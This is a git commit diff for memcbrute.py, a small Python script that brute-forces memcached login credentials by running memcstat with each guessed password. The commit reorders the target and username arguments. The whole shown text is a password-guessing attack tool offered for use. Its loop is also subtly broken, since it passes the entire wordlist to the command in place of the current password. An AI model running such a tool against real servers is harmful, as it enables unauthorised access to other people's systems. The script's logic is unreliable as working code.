22f3c3ae58c1ec4bb331c720d4d2d8c30ad3ae25
Kr0ff <35173514+Kr0ff@users.noreply.github.com>
2020-01-29 20:52:30 +0000

    Small typos

--- memcbrute.py
+++ memcbrute.py
@@ -15,12 +15,12 @@ art = ("""
 
 """)
 
-usage = ("Usage: ./memcbrute.py <username> <target> <wordlist>")
+usage = ("Usage: ./memcbrute.py <target> <username> <wordlist>")
 
-def bruteforce(user, target, wordlist):
+def bruteforce(target, user, wordlist):
     try:
         for passwd in wordlist:
-            cmd = subprocess.getoutput("/bin/memcstat --username={} --servers={} --password={}".format(user, target, wordlist))
+            cmd = subprocess.getoutput("/bin/memcstat --servers={} --username={} --password={}".format(target, user, wordlist))
             if len(cmd) > 0:
                 #print(cmd) #Enable if you want to see the output of the command
                 print(colored('[+] Password found: {}'.format(passwd), "green"))
